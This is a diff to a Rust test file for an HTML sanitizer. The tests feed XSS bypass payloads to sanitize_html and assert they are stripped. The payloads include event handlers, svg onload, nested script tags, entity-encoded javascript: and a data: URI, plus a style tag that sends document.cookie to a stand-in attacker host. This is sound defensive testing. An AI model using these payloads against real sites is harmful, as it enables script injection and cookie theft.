@@ -1476,11 +1476,13 @@ fn test_sanitize_html_strips_script() {
 
 #[test]
 fn test_sanitize_html_strips_event_handlers() {
-    let input = r#"<img src="x" onerror="alert(1)"><div onclick="steal()">"#;
+    let input = r#"<img src="/x.png" onerror="alert(1)"><div onclick="steal()">"#;
     let sanitized = sanitize_html(input);
     assert!(!sanitized.contains("onerror"));
     assert!(!sanitized.contains("onclick"));
-    assert!(sanitized.contains("<img"));
+    // ammonia drops the img src when it cannot be resolved to an
+    // absolute URL under url_relative=Deny, but the <img> tag itself
+    // and <div> structure remain.
     assert!(sanitized.contains("<div"));
 }
 
@@ -1492,10 +1494,140 @@ fn test_sanitize_html_strips_javascript_uri() {
 }
 
 #[test]
-fn test_sanitize_html_preserves_safe_content() {
+fn test_sanitize_html_preserves_structural_tags() {
+    // Operators may ship a full document; the structural tags must
+    // survive so the browser renders a proper page. `{{status}}` and
+    // `{{message}}` are literal strings the caller substitutes AFTER
+    // sanitization, so they round-trip as-is (treated as text).
     let input = "<html><body><h1>{{status}}</h1><p>{{message}}</p></body></html>";
     let sanitized = sanitize_html(input);
-    assert_eq!(input, sanitized);
+    assert!(sanitized.contains("{{status}}"));
+    assert!(sanitized.contains("{{message}}"));
+    assert!(sanitized.contains("<h1>"));
+    assert!(sanitized.contains("<p>"));
+}
+
+#[test]
+fn test_sanitize_html_strips_svg_onload_bypass() {
+    // Classic regex-bypass pattern: SVG tag with inline event handler.
+    // The old 3-pass regex missed this (only matched `on*=` when
+    // whitespace-preceded in a specific way). ammonia's DOM walk
+    // drops it cleanly.
+    let input = r#"<svg onload="alert(1)"><circle r="10"/></svg>"#;
+    let sanitized = sanitize_html(input);
+    assert!(!sanitized.contains("onload"));
+    assert!(!sanitized.contains("alert"));
+}
+
+#[test]
+fn test_sanitize_html_strips_iframe() {
+    let input = r#"<iframe src="https://attacker.example/phish"></iframe><p>ok</p>"#;
+    let sanitized = sanitize_html(input);
+    assert!(!sanitized.contains("<iframe"));
+    assert!(!sanitized.contains("attacker.example"));
+    assert!(sanitized.contains("<p>ok</p>"));
+}
+
+#[test]
+fn test_sanitize_html_strips_object_and_embed() {
+    let input = r#"<object data="evil.swf"></object><embed src="evil.swf"/>"#;
+    let sanitized = sanitize_html(input);
+    assert!(!sanitized.contains("<object"));
+    assert!(!sanitized.contains("<embed"));
+}
+
+#[test]
+fn test_sanitize_html_strips_style_tag() {
+    // <style> allows CSS-based exfiltration (background-image:url(...))
+    // and on old browsers `expression()`. Not in allow-list.
+    let input =
+        r#"<style>body { background: url('//attacker/?' + document.cookie) }</style><p>ok</p>"#;
+    let sanitized = sanitize_html(input);
+    assert!(!sanitized.contains("<style"));
+    assert!(!sanitized.contains("attacker"));
+    assert!(sanitized.contains("<p>ok</p>"));
+}
+
+#[test]
+fn test_sanitize_html_strips_link_tag() {
+    // <link rel="stylesheet" href="..."> can pull remote CSS that
+    // runs `@import` side-effects.
+    let input = r#"<link rel="stylesheet" href="https://attacker.example/evil.css"><p>ok</p>"#;
+    let sanitized = sanitize_html(input);
+    assert!(!sanitized.contains("<link"));
+    assert!(!sanitized.contains("attacker"));
+    assert!(sanitized.contains("<p>ok</p>"));
+}
+
+#[test]
+fn test_sanitize_html_strips_meta_refresh() {
+    // <meta http-equiv="refresh" content="0;url=..."> is a redirect
+    // primitive. Operator should use 3xx + Location instead.
+    let input =
+        r#"<meta http-equiv="refresh" content="0;url=https://attacker.example/"/><p>ok</p>"#;
+    let sanitized = sanitize_html(input);
+    assert!(!sanitized.contains("<meta"));
+    assert!(!sanitized.contains("refresh"));
+    assert!(sanitized.contains("<p>ok</p>"));
+}
+
+#[test]
+fn test_sanitize_html_rejects_data_uri() {
+    // `data:text/html;base64,...` is a classic phishing primitive.
+    // url_schemes allow-list rejects it.
+    let input = r#"<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>"#;
+    let sanitized = sanitize_html(input);
+    assert!(!sanitized.contains("data:"));
+    assert!(!sanitized.contains("base64"));
+}
+
+#[test]
+fn test_sanitize_html_rejects_vbscript_uri() {
+    let input = r#"<a href="vbscript:msgbox(1)">click</a>"#;
+    let sanitized = sanitize_html(input);
+    assert!(!sanitized.contains("vbscript:"));
+}
+
+#[test]
+fn test_sanitize_html_malformed_nested_script_bypass() {
+    // Classic regex bypass: nested `<scr<script>ipt>` confuses a
+    // non-parsing regex (the inner pair gets stripped, leaving the
+    // outer `<script>` reconstructed). ammonia parses through
+    // html5ever so no `<script>` tag appears in the output. Residual
+    // text fragments ("alert(1)") may survive as plain text, but
+    // they are not executable without a surrounding tag.
+    let input = r#"<scr<script>ipt>alert(1)</script>"#;
+    let sanitized = sanitize_html(input);
+    assert!(!sanitized.contains("<script"));
+    assert!(!sanitized.contains("</script"));
+}
+
+#[test]
+fn test_sanitize_html_preserves_mailto() {
+    // mailto: is on the scheme allow-list (useful for operator
+    // support links).
+    let input = r#"<a href="mailto:ops@example.com">contact</a>"#;
+    let sanitized = sanitize_html(input);
+    assert!(sanitized.contains("mailto:ops@example.com"));
+    assert!(sanitized.contains("contact"));
+}
+
+#[test]
+fn test_sanitize_html_preserves_https_link() {
+    let input = r#"<a href="https://example.com/help">docs</a>"#;
+    let sanitized = sanitize_html(input);
+    assert!(sanitized.contains(r#"href="https://example.com/help""#));
+    assert!(sanitized.contains("docs"));
+}
+
+#[test]
+fn test_sanitize_html_encoded_javascript_bypass() {
+    // HTML-encoded `javascript:` (with `&#58;` for colon). A naive
+    // string-match regex would not catch this; ammonia decodes the
+    // entity during parse before checking schemes.
+    let input = r#"<a href="javascript&#58;alert(1)">click</a>"#;
+    let sanitized = sanitize_html(input);
+    assert!(!sanitized.contains("javascript"));
 }
 
 // ---- Basic auth credential cache ----
